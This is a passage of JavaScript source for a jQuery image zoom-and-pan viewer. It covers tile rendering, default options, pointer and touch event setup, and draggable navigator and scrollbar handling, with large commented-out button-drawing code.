			const viewportHeight = parseInt(this.#canvas.height * ratio);
			const left = tileLeft;
			const top = tileTop;
			const right = tileLeft + tileWidth;
			const bottom = tileTop + tileHeight;
			const x = ((left - viewportLeft) * this.#canvas.width / viewportWidth);
			const y = ((top - viewportTop) * this.#canvas.height / viewportHeight);
			const w = ((right - left) * this.#canvas.width / viewportWidth);
			const h = ((bottom - top) * this.#canvas.height / viewportHeight);
			ctx.drawImage(tile.tile, x, y, w, h);
		}
		console.log(tiles.length);
	}

	#renderThumb() {
		const ctx = this.#canvas.getContext('2d');
		ctx.imageSmoothingEnabled = true;
		const thumbLeft = parseInt(this.#viewport.left * this.#thumbRatio);
        const thumbTop = parseInt(this.#viewport.top * this.#thumbRatio);
        const thumbWidth = parseInt(this.#viewport.width * this.#thumbRatio);
        const thumbHeight = parseInt(this.#viewport.height * this.#thumbRatio);
        const ratio = thumbWidth / this.#canvas.width;
        const viewportWidth = parseInt(this.#canvas.width * ratio);
        const viewportHeight = parseInt(this.#canvas.height * ratio);
        ctx.drawImage(this.#thumbBitmap, thumbLeft, thumbTop, viewportWidth, viewportHeight, 0, 0, this.#canvas.width, this.#canvas.height);
	}
}


(function ($, window, document) {

	/*****************************************************************************
		Default settings:
		For detailed description of individual parameters, see the help document
	******************************************************************************/
	var NAVIGATOR_SIZE = 120;
	var hintTimeout;
	var pagingTimeout;
	var mousewheelTimeout;
	var defaults = {

		width: '',									//Width of the view area [480, '480px', '100%']
		height: '',									//Height of the view area [480, '480px', '100%']

		initial_ZOOM: 100,							//Initial zoom level to start with (in percentage) [100]
		initial_POSITION: '',						//Initial location to be focused in pixel value [150,150 or 150 150]

		animation_SMOOTHNESS: 0,					//Ease or smoothness of all movements [Any number from 0]
		animation_SPEED_ZOOM: 0,					//Speed of zoom movements [Any number from 0]
		animation_SPEED_PAN: 0,					//Speed of pan movements [Any number from 0]

		zoom_MAX: 800,								//Maximum limit for zooming (in percentage)
		zoom_MIN: 5,								//Minimum limit for zooming (in percentage)
		zoom_SINGLE_STEP: false,					//To reach maximum and minimum zoom levels in single click
		zoom_OUT_TO_FIT: false,						//To allow image to be zoomed out with whitespace on sides
		zoom_BUTTONS_SHOW: false,					//To enable/disable the + and - buttons

		pan_BUTTONS_SHOW: false,						//To enable/disable the arrow and reset buttons
		pan_LIMIT_BOUNDARY: true,					//To allow/restrict moving the image beyond boundaries
		pan_REVERSE: false,

		reset_ALIGN_TO: 'center center', 			//Image can be aligned to desired position on reset. Example: 'Top Left'
		reset_TO_ZOOM_MIN: false,					//How it should behave if zoom_MIN value set and while clicking reset button,

		button_SIZE: 18,							//Button width and height (in pixels)
		button_SIZE_TOUCH_DEVICE: 30,				//Button width and height (in pixels) on touch devices
		button_COLOR: '#FFFFFF',					//Button color in hexadecimal
		button_BG_COLOR: '#000000',					//Button set's background color in hexadecimal
		button_BG_TRANSPARENCY: 55,					//Background transparency (in percentage)
		button_AUTO_HIDE: false,					//To hide the button set when mouse moved outside the view area
		button_AUTO_HIDE_DELAY: 1,					//Auto hide delay time in seconds
		button_ALIGN: 'bottom right',				//Button set can be aligned to any side or center
		button_MARGIN: 10,							//Space between button set and view port's edge
		button_ROUND_CORNERS: true,					//To enable disable roundness of button corner

		touch_DRAG: true,							//Enable/disable the dragability of image (touch)
		mouse_DRAG: true,							//Enable/disable the dragability of image (mouse)
		mouse_WHEEL: true,							//Enable/disable mousewheel zoom
		mouse_WHEEL_CURSOR_POS: true,				//Enable/disable position sensitive mousewheel zoom
		mouse_DOUBLE_CLICK: true,					//Enable/disable zoom action with double click

		background_COLOR: '#FFFFFF',				//Background colour of image container
		border_SIZE: 1,								//Border size of view area
		border_COLOR: '#000000',					//Border color of view area
		border_TRANSPARENCY: 10,					//Border transparency of view area

		image_url: '',								//Set url or image to be zoomed
		image_original_width: '',					//Original width of main image
		image_original_height: '',					//Original height of main image
		container: '',								//Set container element of image (id of container)

		on_IMAGE_LOAD: '',							//To Call external function immediatly after image loaded
		on_ZOOM_PAN_UPDATE: '',						//To Call external function for each zoom, pan animation frame
		on_ZOOM_PAN_COMPLETE: '',					//To Call external function whenever zoom, pan animation completes
		on_LANDMARK_STATE_CHANGE: '',				//To Call external function whenever the zoom leval crosses global "data-show-at-zoom" value

		use_3D_Transform: true,						//To enable / disable Hardware acceleration on webkit browsers

		responsive: false,							//To enable / disable Responsive / fluid layout
		responsive_maintain_ratio: true,			//To maintain view area width/height ratio or not
		max_WIDTH: '',								//Maximum allowed width of view area (helpful when 'width' parameter set with % and need limit)
		max_HEIGHT: ''								//Maximum allowed height of view area (helpful when 'height' parameter set with % and need limit)
	};

	var $scope;

	function Zoomer($elem, params) {

		var self = this,
		op = $.extend({}, defaults, params);
		this.$elem = $elem;
		this.hasTouch = this.checkTouchSupport ();

		/**********************************************************
		Option values verified and formated if needed
		**********************************************************/
		this.sW = op.width;
		this.sH = op.height;

		this.init_zoom = op.initial_ZOOM / 100;
		this.init_pos = op.initial_POSITION.replace(/,/g, ' ').replace(/\s{2,}/g, ' ').split(' ');

		this.zoom_max = op.zoom_MAX / 100;
		this.zoom_min = op.zoom_MIN / 100;

		this.zoom_single = checkBoolean (op.zoom_SINGLE_STEP);
		this.zoom_fit = checkBoolean (op.zoom_OUT_TO_FIT);
		this.zoom_speed = 1 + (((op.animation_SPEED === 0 || op.animation_SPEED? op.animation_SPEED : op.animation_SPEED_ZOOM) + 1) / 20);
		this.zoom_show = checkBoolean (op.zoom_BUTTONS_SHOW);

		this.pan_speed_o = (op.animation_SPEED === 0 || op.animation_SPEED ? op.animation_SPEED : op.animation_SPEED_PAN);
		this.pan_show = checkBoolean (op.pan_BUTTONS_SHOW);
		this.pan_limit = checkBoolean (op.pan_LIMIT_BOUNDARY);
		this.pan_rev = checkBoolean (op.pan_REVERSE);

		this.reset_align = op.reset_ALIGN_TO.toLowerCase().split(' ');
		this.reset_to_zmin = checkBoolean(op.reset_TO_ZOOM_MIN);

		this.bu_size = parseInt((this.hasTouch? op.button_SIZE_TOUCH_DEVICE : op.button_SIZE)/2)*2;
		this.bu_color = op.button_COLOR;
		this.bu_bg = op.button_BG_COLOR;
		this.bu_bg_alpha = op.button_BG_TRANSPARENCY / 100;
		this.bu_icon = op.button_ICON_IMAGE;
		this.bu_auto = checkBoolean (op.button_AUTO_HIDE);

		this.bu_delay = op.button_AUTO_HIDE_DELAY * 1000;
		this.bu_align = op.button_ALIGN.toLowerCase().split(' ');
		this.bu_margin = op.button_MARGIN;
		this.bu_round = checkBoolean (op.button_ROUND_CORNERS);

		this.touch_drag = checkBoolean (op.touch_DRAG);
		this.mouse_drag = checkBoolean (op.mouse_DRAG);
		this.mouse_wheel = checkBoolean (op.mouse_WHEEL);
		this.mouse_wheel_cur = checkBoolean (op.mouse_WHEEL_CURSOR_POS);
		this.mouse_dbl_click = checkBoolean (op.mouse_DOUBLE_CLICK);

		this.ani_smooth =  Math.max(1, (op.animation_SMOOTHNESS+1)/1.45);

		this.bg_color = op.background_COLOR;
		this.bord_size = op.border_SIZE;
		this.bord_color = op.border_COLOR;
		this.bord_alpha = op.border_TRANSPARENCY / 100;

		this.container = op.container;
		this.image_url = op.image_url;
		this.image_width = op.image_original_width;
		this.image_height = op.image_original_height;

		this.responsive = checkBoolean (op.responsive);
		this.maintain_ratio = checkBoolean (op.responsive_maintain_ratio);
		this.w_max = op.max_WIDTH;
		this.h_max = op.max_HEIGHT;

		this.onLOAD = op.on_IMAGE_LOAD;
		this.onUPDATE = op.on_ZOOM_PAN_UPDATE;
		this.onZOOM_PAN = op.on_ZOOM_PAN_COMPLETE;
		this.onLANDMARK = op.on_LANDMARK_STATE_CHANGE;

		/***********************************************************
		Variables for inner operation.
		x, y, width, height and scale value of image
		***********************************************************/
		this._x;
		this._y;
		this._w;
		this._h;
		this._sc = 0;

		this.rA = 1;
		this.rF = 1;
		this.rR = 1;
		this.iW = 0;
		this.iH = 0;
		this.tX = 0;
		this.tY = 0;
		this.oX = 0;
		this.oY = 0;
		this.fX = 0;
		this.fY = 0;
		this.dX = 0;
		this.dY = 0;
		this.cX = 0;
		this.cY = 0;

		this.transOffX = 0;
		this.transOffY = 0;
		this.focusOffX = 0;
		this.focusOffY = 0;
		this.offX = 0;
		this.offY = 0;

		/***********************************************************
		Flags that convey current states and events
		***********************************************************/
		this._playing = false;
		this._dragging = false;
		this._onfocus = false;
		this._moveCursor = false;
		this._wheel = false;
		this._recent = 'zoomOut';
		this._pinching = false;
		this._landmark = false;
		this._rA;
		this._centx;
		this._centy;
		this._onButton = false;
		this._onHitArea = false;
		this.cFlag = {
			_zi: false,
			_zo: false,
			_ml: false,
			_mr: false,
			_mu: false,
			_md: false,
			_rs: false,
			_nd: false
		};

		/***********************************************************
		Elements and arrays that references elements
		***********************************************************/
		this.$holder;
		this.$hitArea;
		this.$controls;
		this.$loc_cont;
		this.map_coordinates = [];
		this.locations = [];
		this.buttons = [];
		this.border = [];

		/***********************************************************
		miscellaneous
		***********************************************************/
		this.buttons_total = 7;
		this.cButtId = 0;
		this.pan_speed;
		this.auto_timer;
		this.ani_timer;
		this.ani_end;
		this.focusSpeed = this.reduction = .5;
		this.orig_style;
		this.mapAreas;
		this.icons;
		this.show_at_zoom;
		this.assetsLoaded = false;
		this.zStep = 0;
		this.sRed = 300;
		this.use3D = op.use_3D_Transform && supportsTrans3D;

		// Set events to support pointer / touch / mouse
		if (navigator.pointerEnabled || navigator.msPointerEnabled) {
			//Pointer
			if (navigator.pointerEnabled) {
				this.pointerDown = 'pointerdown';
				this.pointerUp = 'pointerup';
				this.pointerMove = 'pointermove';

			} else if (navigator.msPointerEnabled) {
				this.pointerDown = 'MSPointerDown';
				this.pointerUp = 'MSPointerUp';
				this.pointerMove = 'MSPointerMove';

			}
			this.event_down = this.pointerDown+ '.sz';
			this.event_up 	= this.pointerUp+ '.sz';
			this.event_move = this.pointerMove+ '.sz';

			this.supportsPointer = true;
			this.pointers = [];

		} else if (this.hasTouch){
			//Touch	only
			this.event_down = 'touchstart'+ '.sz';
			this.event_up 	= 'touchend'+ '.sz';
			this.event_move = 'touchmove'+ '.sz';

		} else {
			//Mouse only
			this.event_down = 'mousedown'+ '.sz';
			this.event_up 	= 'mouseup'+ '.sz';
			this.event_move = 'mousemove'+ '.sz';
		}

		//Case 1: Image specificed (possibly) through img tag:
		if (this.image_url == '') {
			this.$image = $elem;
			this.id = this.$image.attr('id');

		//Case 2: Image url specificed through parameter:
		} else {
			var img = new Image();
			if (this.image_width) {
				img.width = this.image_width;
			}
			if (this.image_height) {
				img.height = this.image_height;
			}
			img.src = this.image_url;
			this.$image = $(img).appendTo($elem);
		}


		//Prepare container div (Basically the element that masks image with overflow hidden)
		this.setContainer();

		//Get button icon image's url
		// var testOb;
		// if (!this.bu_icon) {
		// 	var regx=/url\(["']?([^'")]+)['"]?\)/;
		// 	testOb = $('<div class="smooth_zoom_icons"></div>');
		// 	this.$holder.append(testOb);
		// 	this.bu_icon = testOb.css("background-image").replace(regx,'$1');
		// 	if (this.bu_icon == 'none') {
		// 		this.bu_icon = 'zoom_assets/icons.png';
		// 	}
		// 	testOb.remove();
		// }

		//Firefox feature checkup
		// if (this.$image.css('-moz-transform') && prop_transform) {
		// 	testOb = $('<div style="-moz-transform: translate(1px, 1px)"></div>');
		// 	this.$holder.append(testOb);
		// 	this.fixMoz = testOb.position().left === 1 ? false : true;
		// 	testOb.remove();
		// } else {
		// 	this.fixMoz = false;
		// }
		this.fixMoz = false;

		//Preload icons and main image.
		// this.$image.hide();
		this.imgList = [
			// {loaded: false, src: this.bu_icon || 'zoom_assets/icons.png'}, //Icon image
			{loaded: false, src: this.image_url == ''? this.$image.attr('src') : this.image_url} // Main image
		];

		$.each(this.imgList, function (i){
			var _img = new Image();
			$(_img) .bind('load', {id:i, self: self}, self.loadComplete)
					.bind('error', {id:i, self: self}, self.loadComplete); //Allow initiation even if image is not there :(
			_img.src = self.imgList[i].src;
		});

		// init draggable
		function updateByNavigator (offsetX, offsetY) {
			let maxEdge = NAVIGATOR_SIZE;
            let backgroundHeight;
            let backgroundWidth;
            let ratio;
            if ($bodyScope.current.width > $bodyScope.current.height) {
            	ratio = $bodyScope.current.width / $bodyScope.current.height;
            	backgroundWidth = NAVIGATOR_SIZE;
            	backgroundHeight = parseInt(NAVIGATOR_SIZE / ratio);
            }
            else {
            	ratio = $bodyScope.current.height / $bodyScope.current.width;
            	backgroundHeight = NAVIGATOR_SIZE;
            	backgroundWidth = parseInt(NAVIGATOR_SIZE / ratio);
            }
			let left = (offsetX - self.scrollbar.navigatorViewport.width() / 2) / backgroundWidth;
			let top = (offsetY - self.scrollbar.navigatorViewport.height() / 2) / backgroundHeight;
			self.tY = -$bodyScope.current.height * self._sc * top;
			let startX = (self._w / 2) - ($bodyScope.current.width / 2) * self._sc;
			self.tX = -startX - (left * $bodyScope.current.width * self._sc);
			self.changeOffset(true, true);
			self.Animate();
		}

		self.scrollbar.navigator.on("mousedown", function (event) {
			event.stopPropagation();
			updateByNavigator(event.offsetX, event.offsetY);
		});

		self.scrollbar.navigatorViewport.on("mousedown", function (event) {
			event.stopPropagation();
		});

		self.scrollbar.horizontal.on("mousedown", function (event) {
			event.stopPropagation();
		});

		self.scrollbar.vertical.on("mousedown", function (event) {
			event.stopPropagation();
		});

		self.scrollbar.navigatorViewport.draggable({ 
			// axis: "x", 
			// containment: self.scrollbar.navigator, 
			scroll: false,
			start: function (event, ui) {
			},
			drag: function(event, ui) {
				// 計算 background 邊界大小
	            let maxEdge = NAVIGATOR_SIZE;
	            let backgroundHeight;
	            let backgroundWidth;
	            let ratio;
	            if ($bodyScope.current.width > $bodyScope.current.height) {
	            	ratio = $bodyScope.current.width / $bodyScope.current.height;
	            	backgroundWidth = NAVIGATOR_SIZE;
	            	backgroundHeight = parseInt(NAVIGATOR_SIZE / ratio);
	            }
	            else {
	            	ratio = $bodyScope.current.height / $bodyScope.current.width;
	            	backgroundHeight = NAVIGATOR_SIZE;
	            	backgroundWidth = parseInt(NAVIGATOR_SIZE / ratio);
	            }
				let left = ui.position.left / backgroundWidth;
				let top = ui.position.top / backgroundHeight;
				self.tY = -$bodyScope.current.height * self._sc * top;
				let startX = (self._w / 2) - ($bodyScope.current.width / 2) * self._sc;
				self.tX = -startX - (left * $bodyScope.current.width * self._sc);
				self.changeOffset(true, true);
				self.Animate();
			},
			stop: function (event, ui) {
			}
		});
		
		// 横向 Scrollbar 拖拽
		self.dragHorizontalStartProgess;
		self.dragHorizontalOriginal;
		self.scrollbar.horizontal.draggable({ 
			axis: "x", 
			containment: "parent", 
			scroll: false,
			start: function (event, ui) {
				var thumbnailWidth = $(event.target).width();
				var left = ui.position.left;
				var progress = Math.abs(left / (self.sW - thumbnailWidth) * 100);
				self.dragHorizontalStartProgess = progress;
				self.dragHorizontalOriginal = self.tX;
			},
			drag: function(event, ui) {
				var thumbnailWidth = $(event.target).width();
				var left = ui.position.left;
				var progress = Math.abs(left / (self.sW - thumbnailWidth) * 100);
				if (progress > 100) progress = 100;
				var offsetProgress = progress - self.dragHorizontalStartProgess;
				var offsetX = $scope.current.width * self._sc * offsetProgress / 100;
				self.tX = self.dragHorizontalOriginal - offsetX;
				self.changeOffset(true, true);
				self.Animate();
			},
			stop: function (event, ui) {
				self.dragHorizontalStartProgess = undefined;
				self.dragHorizontalOriginal = undefined;
			}
		});

		// 横向 Scrollbar 拖拽
		self.dragVerticalStartProgess;
		self.dragVerticalOriginal;
		self.scrollbar.vertical.draggable({ 
			axis: "y", 
			containment: "parent", 
			scroll: false,
			start: function (event, ui) {
				var thumbnailHeight = $(event.target).height();
				var top = ui.position.top;
				var progress = Math.abs(top / (self.sH - thumbnailHeight - 80) * 100);
				self.dragVerticalStartProgess = progress;
				self.dragVerticalOriginal = self.tY;
			},
			drag: function(event, ui) {
				var thumbnailHeight = $(event.target).height();
				var top = ui.position.top;
				var progress = Math.abs(top / (self.sH - thumbnailHeight - 80) * 100);
				if (progress > 100) progress = 100;
				var offsetProgress = progress - self.dragVerticalStartProgess;
				var offsetY = Math.ceil($scope.current.height * self._sc * offsetProgress / 100);
				self.tY = self.dragVerticalOriginal - offsetY;
				self.changeOffset(true, true);
				self.Animate();
			},
			stop: function (event, ui) {
				self.dragVerticalStartProgess = undefined;
				self.dragVerticalOriginal = undefined;
			}
		});
	}

	Zoomer.prototype = {

		/*Preload the icon and main image
		*********************************************************************************************************************/
		loadComplete: function (e) {
			var self = e.data.self,
				complete = true;

			self.imgList[e.data.id].loaded = true;
			for (var j=0; j<self.imgList.length; j++){
				if (!self.imgList[j].loaded) {
					complete = false;
				}
			}
			if (complete) {
				self.assetsLoaded = true;

				//Assets loaded, initiate plugin
				self.init();
				if (self.onLOAD !== '') {
					self.onLOAD();
				}
			}
		},


		/*Make sure the device has touch screen support
		*********************************************************************************************************************/
		checkTouchSupport: function (){
			var touch = 'ontouchstart' in window || 'createTouch' in document;
			if (navigator.pointerEnabled) {
				touch =  Boolean(touch || navigator.maxTouchPoints);
			} else if (navigator.msPointerEnabled) {
				touch = Boolean(touch || navigator.msMaxTouchPoints);
			}
			return touch;
		},


		/*Initiate after assets loaded
		***********************************************************************************************************************/
		init: function () {
			var self = this,
				$image = self.$image,
				sW = self.sW,
				sH = self.sH,
				container = self.container,
				cBW, cBH, pan_show = self.pan_show,
				zoom_show = self.zoom_show,
				$controls = self.$controls,
				buttons = self.buttons,
				cFlag = self.cFlag,
				bu_align = self.bu_align,
				bu_margin = self.bu_margin,
				$holder = self.$holder;

			//Store the default image properties so that it can be reverted back when plugin needs to be destroyed
			self.orig_style = self.getStyle();

			//IE 6 Image tool bar disabled
			// $image.attr('galleryimg', 'no');

			if (!navigator.userAgent.toLowerCase().match(/(iphone|ipod|ipad)/)) {
				$image.removeAttr('width');
				$image.removeAttr('height');
			}

			//In case parent element's display property set to 'none', we need to first set them 'block', measure the width and height and then set them back to 'none'
			var temp = $image,
			dispArray = [];
			for (var i = 0; i<5; i++) {
				if (temp && temp[0] && temp[0].tagName !== 'BODY' && temp[0].tagName !== 'HTML'){
					if (temp.css('display') == 'none') {
						temp.css('display', 'block');
						dispArray.push(temp);
					}
					temp = temp.parent();
				} else {
					break;
				}
			}

			self.iW = $image.width();
			self.iH = $image.height();

			for (var i = 0; i< dispArray.length; i++) {
				dispArray[i].css('display', 'none');
			}

			//Initially the image needs to be resized to fit container. To do so, first measure the scaledown ratio
			self.rF = self.rR = self.checkRatio(sW, sH, self.iW, self.iH, self.zoom_fit);

			//If NO Minimum zoom value set
			if (self.zoom_min == 0 || self.init_zoom != 0) {
				if (self.init_zoom != '') {
					self.rA = self._sc = self.init_zoom;
				} else {
					self.rA = self._sc = self.rF;
				}
				if (self.zoom_min != 0) {
					self.rF = self.zoom_min;
					if (self.reset_to_zmin) {
						self.rR = self.zoom_min
					}
				}

			//If Minimum zoom value set
			} else {
				// if (self.rF < self.zoom_min) {
					self.rF = self.zoom_min;
					if (self.reset_to_zmin) {
						self.rR = self.zoom_min
					}
					self.rA = self._sc = self.zoom_min;
				// } else {
				// 	self.rA = self._sc = self.rR;
				// }
			}

			//Width and Height to be applied to the image
			self._w = self._sc * self.iW;
			self._h = self._sc * self.iH;

			//Resize the image and position it centered inside the wrapper
			if (self.init_pos == '') {
				self._x = self.tX = (sW - self._w) / 2;
				self._y = self.tY = (sH - self._h) / 2;
			} else {
				self._x = self.tX = (sW / 2) - parseInt(self.init_pos[0]) * self._sc;
				self._y = self.tY = (sH / 2) - parseInt(self.init_pos[1]) * self._sc;
				self.oX = (self.tX - ((sW - self._w) / 2)) / (self._w / sW);
				self.oY = (self.tY - ((sH - self._h) / 2)) / (self._h / sH);
			}

			if ((!self.pan_limit || self._moveCursor || self.init_zoom != self.rF) && self.mouse_drag) {
				 $image.css('cursor', '-webkit-grab');
				 self.$hitArea.css('cursor', '-webkit-grab');
			}


			if (prop_transform) {
				self.$image.css(prop_origin, '0 0');
			}
			if (self.use3D) {
				$image.css({
					'-webkit-backface-visibility': 'hidden',
					// '-webkit-perspective': 1000
				});
			}

			//Start displaying the image
			$image.css({
					position: 'absolute',
					'z-index': 2,
					left: '0px',
					top: '0px',
					// '-webkit-box-shadow': '1px 1px rgba(0,0,0,0)'
				});
			// $holder.css('background-image', 'none');
				// .hide()
				// .fadeIn(0, function () {

				// });

			//Create Control buttons and events
			var self = self,
				bs = self.bu_size,
				iSize = 50,
				sDiff = 2,
				bSpace = 3,
				mSize = Math.ceil(self.bu_size / 4),
				iconOff = bs < 16 ? 50 : 0,
				bsDiff = bs - sDiff;

			//Show all buttons
			// if (pan_show) {
			// 	if (zoom_show) {
			// 		cBW = parseInt(bs + (bs * .85) + (bsDiff * 3) + (bSpace * 2) + (mSize * 2));
			// 	} else {
			// 		cBW = parseInt((bsDiff * 3) + (bSpace * 2) + (mSize * 2));
			// 	}
			// 	cBH = parseInt((bsDiff * 3) + (bSpace * 2) + (mSize * 2));

			// 	//Show zoom buttons only
			// } else {
			// 	if (zoom_show) {
			// 		cBW = parseInt(bs + mSize * 2);
			// 		cBH = parseInt(bs * 2 + mSize * 3);
			// 		cBW = parseInt(cBW / 2) * 2;
			// 		cBH = parseInt(cBH / 2) * 2;
			// 	} else {
			// 		cBW = 0;
			// 		cBH = 0;
			// 	}
			// }

			// var pOff = (iSize - bs) / 2,
			// 	resetCenterX = cBW - ((bs - (pan_show ? sDiff : 0)) * 2) - mSize - bSpace,
			// 	resetCenterY = (cBH / 2) - ((bs - (pan_show ? sDiff : 0)) / 2);

			// var hProp, vProp, hVal, vVal;
			// //Align button set as per settings
			// if (bu_align[0] == 'top') {
			// 	vProp = 'top';
			// 	vVal = bu_margin;
			// } else if (bu_align[0] == 'center') {
			// 	vProp = 'top';
			// 	vVal = parseInt((sH - cBH) / 2);
			// } else {
			// 	vProp = 'bottom';
			// 	vVal = bu_margin;
			// }
			// if (bu_align[1] == 'right') {
			// 	hProp = 'right';
			// 	hVal = bu_margin;
			// } else if (bu_align[1] == 'center') {
			// 	hProp = 'right';
			// 	hVal = parseInt((sW - cBW) / 2);
			// } else {
			// 	hProp = 'left';
			// 	hVal = bu_margin;
			// }

			// //Buttons Container
			// $controls = $(
			// 	'<div style="position: absolute; ' + hProp + ':' + hVal + 'px; ' + vProp + ': ' + vVal + 'px; width: ' + cBW + 'px; height: ' + cBH + 'px; z-index: 20;" class="noSel">\
			// 		<div class="noSel controlsBg" style="position: relative; width: 100%; height: 100%; z-index: 1;">\
			// 		</div>\
			// 	</div>'
			// );

			// $holder.append($controls);
			// var $controlsBg = $controls.find('.controlsBg');

			//Make the corners rounded
			// if (self.bu_round) {
			// 	if (prop_radius) {
			// 		$controlsBg
			// 			.css(prop_radius, (iconOff > 0 ? 4 : 5) + 'px')
			// 			.css('background-color', self.bu_bg);
			// 	} else {
			// 		self.roundBG(
			// 			$controlsBg,
			// 			'cBg',
			// 			cBW,
			// 			cBH,
			// 			iconOff > 0 ? 4 : 5,
			// 			375,
			// 			self.bu_bg,
			// 			self.bu_icon,
			// 			1,
			// 			iconOff ? 50 : 0
			// 		);
			// 	}
			// } else {
			// 	$controlsBg.css('background-color', self.bu_bg);
			// }

			// $controlsBg.css('opacity', self.bu_bg_alpha);

			//Generating Button properties	(7 buttons)
			// buttons[0] = {
			// 	_var: '_zi',
			// 	l: mSize,
			// 	t: pan_show ? (cBH - (bs * 2) - (bSpace * 2) + 2) / 2 : mSize,
			// 	w: bs,
			// 	h: bs,
			// 	bx: -pOff,
			// 	by: -pOff - iconOff
			// };

			// buttons[1] = {
			// 	_var: '_zo',
			// 	l: mSize,
			// 	t: pan_show ? ((cBH - (bs * 2) - (bSpace * 2) + 2) / 2) + bs + (bSpace * 2) - 2 : cBH - bs - mSize,
			// 	w: bs,
			// 	h: bs,
			// 	bx: -iSize - pOff,
			// 	by: -pOff - iconOff
			// };

			// buttons[2] = {
			// 	_var: self.pan_rev? '_ml' : '_mr',
			// 	l: resetCenterX - bsDiff - bSpace,
			// 	t: resetCenterY,
			// 	w: bsDiff,
			// 	h: bsDiff,
			// 	bx: -(sDiff / 2) - iSize * 2 - pOff,
			// 	by: -(sDiff / 2) - pOff - iconOff
			// };

			// buttons[3] = {
			// 	_var: self.pan_rev? '_mr' : '_ml',
			// 	l: resetCenterX + bsDiff + bSpace,
			// 	t: resetCenterY,
			// 	w: bsDiff,
			// 	h: bsDiff,
			// 	bx: -(sDiff / 2) - iSize * 3 - pOff,
			// 	by: -(sDiff / 2) - pOff - iconOff
			// };

			// buttons[4] = {
			// 	_var: self.pan_rev? '_md' : '_mu',
			// 	l: resetCenterX,
			// 	t: resetCenterY + bsDiff + bSpace,
			// 	w: bsDiff,
			// 	h: bsDiff,
			// 	bx: -(sDiff / 2) - iSize * 4 - pOff,
			// 	by: -(sDiff / 2) - pOff - iconOff
			// };

			// buttons[5] = {
			// 	_var: self.pan_rev? '_mu' : '_md',
			// 	l: resetCenterX,
			// 	t: resetCenterY - bsDiff - bSpace,
			// 	w: bsDiff,
			// 	h: bsDiff,
			// 	bx: -(sDiff / 2) - iSize * 5 - pOff,
			// 	by: -(sDiff / 2) - pOff - iconOff
			// };

			// buttons[6] = {
			// 	_var: '_rs',
			// 	l: resetCenterX,
			// 	t: resetCenterY,
			// 	w: bsDiff,
			// 	h: bsDiff,
			// 	bx: -(sDiff / 2) - iSize * 6 - pOff,
			// 	by: -(sDiff / 2) - pOff - iconOff
			// };

			// for (var i = 0; i < 7; i++) {
			// 	buttons[i].$ob = $(
			// 			'<div style="position: absolute; display: ' + (i < 2 ? zoom_show ? 'block' : 'none' : pan_show ? 'block' : 'none') + '; left: ' + (buttons[i].l - 1) + 'px; top: ' + (buttons[i].t - 1) + 'px; width: ' + (buttons[i].w + 2) + 'px; height: ' + (buttons[i].h + 2) + 'px; z-index:' + (i + 1) + ';" class="noSel">\
			// 			</div>'
			// 		)
			// 	.css('opacity', .7)
			// 	.bind('mouseover.sz mouseout.sz '+self.event_down, {
			// 		id: i

			// 	}, function (e) {
			// 		self._onfocus = false;
			// 		var $this = $(this);

			// 		//Button over
			// 		if (e.type == 'mouseover') {
			// 			if ($this.css('opacity') > .5){
			// 				 $this.css('opacity', 1);
			// 			}

			// 		//Button out
			// 		} else if (e.type == 'mouseout') {
			// 			if ($this.css('opacity') > .5) {
			// 				$this.css('opacity', .7);
			// 			}

			// 		//Button press/down
			// 		} else if (e.type == 'mousedown' || e.type == 'touchstart' || e.type == self.pointerDown) {
			// 			self.cButtId = e.data.id;
			// 			self._onButton = true;
			// 			self._wheel = false;

			// 			//If NOT already down..
			// 			if ($this.css('opacity') > .5) {
			// 				$this.css('opacity', 1);
			// 				$holder.find('#' + buttons[self.cButtId]._var + 'norm').hide();
			// 				$holder.find('#' + buttons[self.cButtId]._var + 'over').show();

			// 				//CASE 1: If zoomIn pressed and single step zoom enabled
			// 				if (self.cButtId <= 1 && self.zoom_single){
			// 					if (!cFlag[buttons[self.cButtId]._var]) {
			// 						self.sRed = 300;
			// 						cFlag[buttons[self.cButtId]._var] = true;
			// 					}

			// 				//CASE 2: If any button except RESET pressed
			// 				} else if (self.cButtId <6) {
			// 					cFlag[buttons[self.cButtId]._var] = true;

			// 				//CASE 3: RESET pressed
			// 				} else {
			// 					cFlag._rs = true;
			// 					self.rA = self.rR;
			// 					if (self.reset_align[0] == 'top') {
			// 						self.fY = (self.sH/2)*(self.rA/2);
			// 					} else if (self.reset_align[0] == 'bottom') {
			// 						self.fY = -(self.sH/2)*(self.rA/2);
			// 					} else {
			// 						self.fY = 0;
			// 					}
			// 					if (self.reset_align[1] == 'left') {
			// 						self.fX = (self.sW/2)*(self.rA/2);
			// 					} else if (self.reset_align[1] == 'right') {
			// 						self.fX = -(self.sW/2)*(self.rA/2);
			// 					} else {
			// 						self.fX = 0;
			// 					}
			// 				}

			// 				self.focusOffX = self.focusOffY = 0;
			// 				self.changeOffset(true, true);
			// 				if(!self._playing) {
			// 					self.Animate();
			// 				}
			// 			}
			// 			e.preventDefault();
			// 			e.stopPropagation();
			// 		}
			// 	});

			// 	//Make 2 BGs for Button Normal and Over state
			// 	//Button BG normal
			// 	var tpm = $(
			// 		'<div id="' + buttons[i]._var + 'norm" style="position: absolute; left: 1px; top: 1px; width: ' + buttons[i].w + 'px; height: ' + buttons[i].h + 'px; '+(prop_radius || !self.bu_round ? 'background:'+self.bu_color : '')+'">\
			// 		</div>'
			// 	);

			// 	//Button BG hover
			// 	var tpmo = $(
			// 		'<div id="' + buttons[i]._var + 'over" style="position: absolute; left: 0px; top: 0px; width: ' + (buttons[i].w + 2) + 'px; height: ' + (buttons[i].h + 2) + 'px; display: none; '+(prop_radius || !self.bu_round ? 'background:'+self.bu_color : '')+'">\
			// 		</div>'
			// 	);

			// 	//Add the button icons
			// 	var cont = $(
			// 		'<div id="' + buttons[i]._var + '_icon" style="position: absolute; left: 1px; top: 1px; width: ' + buttons[i].w + 'px; height: ' + buttons[i].h + 'px; background: transparent url(' + self.bu_icon + ') ' + buttons[i].bx + 'px ' + buttons[i].by + 'px no-repeat;" >\
			// 		</div>'
			// 	);

			// 	buttons[i].$ob.append(tpm, tpmo, cont);
			// 	$controls.append(buttons[i].$ob);

			// 	//Apply corner radius
			// 	if (self.bu_round) {
			// 		if (prop_radius) {
			// 			tpm.css(prop_radius , '2px');
			// 			tpmo.css(prop_radius , '2px');
			// 		} else {
			// 			self.roundBG(
			// 				tpm,
			// 				buttons[i]._var + "norm",
			// 				buttons[i].w,
			// 				buttons[i].h,
			// 				2,
			// 				425,
			// 				self.bu_color,
			// 				self.bu_icon,
			// 				i + 1,
			// 				iconOff ? 50 : 0
			// 			);
			// 			self.roundBG(
			// 				tpmo,
